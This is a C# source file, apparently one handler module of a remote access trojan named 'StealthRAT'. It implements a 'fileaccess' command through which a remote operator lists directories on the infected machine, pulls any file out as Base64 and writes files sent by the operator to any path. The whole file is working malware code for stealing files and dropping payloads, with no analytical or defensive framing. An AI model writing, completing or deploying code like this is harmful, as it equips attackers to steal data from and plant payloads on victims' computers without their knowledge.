using System.Text;
using StealthRAT.Interfaces;

namespace StealthRAT.Handlers;

/// <summary>
/// Handles the "fileaccess" command for remote file system operations.
/// Supports directory listing, file download (server-to-client), and
/// file upload (client-to-server) operations with proper validation.
/// </summary>
public sealed class FileAccessHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "fileaccess";

    /// <inheritdoc/>
    public async Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        if (args.Length < 2)
        {
            return "ERR: Usage: fileaccess <list|download|upload> <path>";
        }

        string subCommand = args[0].ToLowerInvariant();
        string path = string.Join(" ", args.Skip(1)); // Support paths with spaces

        return subCommand switch
        {
            "list" => ListDirectory(path),
            "download" => await SendFileToClientAsync(path, context),
            "upload" => await ReceiveFileFromClientAsync(path, context),
            _ => $"ERR: Unknown subcommand '{subCommand}'. Use: list, download, or upload"
        };
    }

    /// <summary>
    /// Lists the contents of a directory, showing subdirectories and files
    /// with their sizes in a formatted output.
    /// </summary>
    /// <param name="path">The directory path to list.</param>
    /// <returns>Formatted directory listing or error message.</returns>
    private static string ListDirectory(string path)
    {
        try
        {
            var directory = new DirectoryInfo(path);
            if (!directory.Exists)
            {
                return $"ERR: Directory not found: {path}";
            }

            var output = new StringBuilder();
            output.AppendLine($"OK: Directory listing for {directory.FullName}");
            output.AppendLine(new string('-', 60));

            // List subdirectories first
            foreach (DirectoryInfo subDir in directory.GetDirectories())
            {
                output.AppendLine($"  [DIR]  {subDir.Name,-40} {subDir.LastWriteTime:yyyy-MM-dd HH:mm}");
            }

            // Then list files with size information
            foreach (FileInfo file in directory.GetFiles())
            {
                string sizeStr = FormatFileSize(file.Length);
                output.AppendLine($"  [FILE] {file.Name,-40} {sizeStr,10} {file.LastWriteTime:yyyy-MM-dd HH:mm}");
            }

            output.AppendLine(new string('-', 60));
            output.AppendLine($"  {directory.GetDirectories().Length} directories, {directory.GetFiles().Length} files");

            return output.ToString();
        }
        catch (UnauthorizedAccessException)
        {
            return $"ERR: Access denied to directory: {path}";
        }
        catch (Exception ex)
        {
            return $"ERR: {ex.Message}";
        }
    }

    /// <summary>
    /// Sends a file to the connected client using Base64 encoding.
    /// Protocol: Sends header line, then Base64 data, then end marker.
    /// </summary>
    /// <param name="filePath">The path of the file to send.</param>
    /// <param name="context">The command execution context.</param>
    /// <returns>Empty string (response sent directly via writer).</returns>
    private static async Task<string> SendFileToClientAsync(string filePath, CommandContext context)
    {
        if (!File.Exists(filePath))
        {
            return $"ERR: File not found: {filePath}";
        }

        try
        {
            byte[] fileData = await File.ReadAllBytesAsync(filePath, context.CancellationToken);
            string base64Data = Convert.ToBase64String(fileData);
            string fileName = Path.GetFileName(filePath);

            await context.Writer.WriteLineAsync($"OK_FILE {fileName} {fileData.Length}");
            await context.Writer.WriteLineAsync(base64Data);
            await context.Writer.WriteLineAsync("__END__");

            return string.Empty; // Response already sent
        }
        catch (UnauthorizedAccessException)
        {
            return $"ERR: Access denied to file: {filePath}";
        }
        catch (Exception ex)
        {
            return $"ERR: Failed to read file - {ex.Message}";
        }
    }

    /// <summary>
    /// Receives a file from the connected client using Base64 encoding.
    /// Protocol: Sends READY_UPLOAD, then reads Base64 data until end marker.
    /// </summary>
    /// <param name="destinationPath">The path where the file should be saved.</param>
    /// <param name="context">The command execution context.</param>
    /// <returns>Success or error message.</returns>
    private static async Task<string> ReceiveFileFromClientAsync(string destinationPath, CommandContext context)
    {
        try
        {
            // Signal readiness to receive
            await context.Writer.WriteLineAsync("READY_UPLOAD");

            // Read Base64-encoded file data
            var reader = new StreamReader(context.Stream, Encoding.UTF8, leaveOpen: true);
            var base64Builder = new StringBuilder();
            string? line;

            while ((line = await reader.ReadLineAsync(context.CancellationToken)) != null)
            {
                if (line == "__END__") break;
                base64Builder.Append(line);
            }

            // Decode and save the file
            byte[] fileData = Convert.FromBase64String(base64Builder.ToString());

            // Ensure the destination directory exists
            string? directoryPath = Path.GetDirectoryName(destinationPath);
            if (!string.IsNullOrEmpty(directoryPath))
            {
                Directory.CreateDirectory(directoryPath);
            }

            await File.WriteAllBytesAsync(destinationPath, fileData, context.CancellationToken);

            return $"OK: File saved to {destinationPath} ({FormatFileSize(fileData.Length)})";
        }
        catch (FormatException)
        {
            return "ERR: Invalid Base64 data received";
        }
        catch (UnauthorizedAccessException)
        {
            return $"ERR: Access denied writing to: {destinationPath}";
        }
        catch (Exception ex)
        {
            return $"ERR: Failed to receive file - {ex.Message}";
        }
    }

    /// <summary>
    /// Formats a file size in bytes to a human-readable string.
    /// </summary>
    /// <param name="bytes">The file size in bytes.</param>
    /// <returns>Formatted size string (e.g., "1.5 MB").</returns>
    private static string FormatFileSize(long bytes)
    {
        string[] suffixes = ["B", "KB", "MB", "GB", "TB"];
        int suffixIndex = 0;
        double size = bytes;

        while (size >= 1024 && suffixIndex < suffixes.Length - 1)
        {
            size /= 1024;
            suffixIndex++;
        }

        return suffixIndex == 0
            ? $"{size:F0} {suffixes[suffixIndex]}"
            : $"{size:F1} {suffixes[suffixIndex]}";
    }
}
